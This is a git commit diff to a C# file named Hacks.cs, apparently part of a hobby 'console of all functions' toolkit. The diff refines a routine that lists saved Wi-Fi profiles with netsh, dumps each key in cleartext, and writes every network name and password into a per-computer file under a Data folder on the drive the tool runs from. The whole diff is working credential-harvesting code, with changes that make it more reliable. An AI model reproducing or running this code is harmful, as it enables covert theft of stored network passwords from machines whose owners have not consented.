39cb7636b920a0bb9a31fbb3ca52be243fddd9ed
Ryuzaki <andrefranca86@gmail.com>
2019-09-08 13:47:16 -0400

    Final corrections

--- console-of-all-functions/libraries/hacks/Hacks.cs
+++ console-of-all-functions/libraries/hacks/Hacks.cs
@@ -16,20 +16,32 @@ namespace console_of_all_functions.libraries.hacks
         {
             try
             {
-                string createWifiFile = "/c netsh wlan show profiles>wifiNames.txt";
+                string createWifiFile = "/u /c netsh wlan show profiles>wifiNames.txt";
                 System.Diagnostics.Process.Start("CMD.exe", createWifiFile);
                 var lines = File.ReadAllLines("wifiNames.txt", Encoding.UTF8);
                 string device = Directory.GetCurrentDirectory().Substring(0, 2);
                 string computer = Environment.MachineName;
+                if (!Directory.Exists(device + "\\Data\\" + computer))
+                {
+                    Directory.CreateDirectory(device + "\\Data\\" + computer);
+                }
                 var output = File.CreateText(device + "\\Data\\" + computer + "\\wifiPasswords.txt");
 
-                foreach (var line in lines.Where(x=>x.Contains("Todos")||x.Contains("All")))
+                foreach (var line in lines.Where(x => x.Contains("Todos") || x.Contains("All")))
                 {
-                    string wifiName = line.Split(':')[1];
-                    string getWifiPassword = "/c netsh wlan show profile " + wifiName + " key=clear>wifiInfo.txt";
-                    System.Diagnostics.Process.Start("CMD.exe", getWifiPassword);
+                    string wifiName = line.Split(':')[1].Trim();
+                    string getWifiPassword = "/u /c netsh wlan show profile \"" + wifiName + "\" key=clear>wifiInfo.txt";
+                    System.Diagnostics.Process.Start("CMD.exe", getWifiPassword).WaitForExit(1000);
                     var info = File.ReadAllLines("wifiInfo.txt", Encoding.UTF8).ToList();
-                    string fileWrite = "Wifi name: " + wifiName + "  Password: " + info.Where(x => x.Contains("Conteúdo da Chave")).First().Split(':')[1];
+                    string fileWrite="";
+                    try
+                    {
+                        fileWrite = "Wifi name: " + wifiName + "  Password: " + info.Where(x => x.Contains("do da Chave")).First().Split(':')[1].Trim();
+                    }
+                    catch
+                    {
+                        continue;
+                    }
                     output.WriteLine(fileWrite);
                 }
 
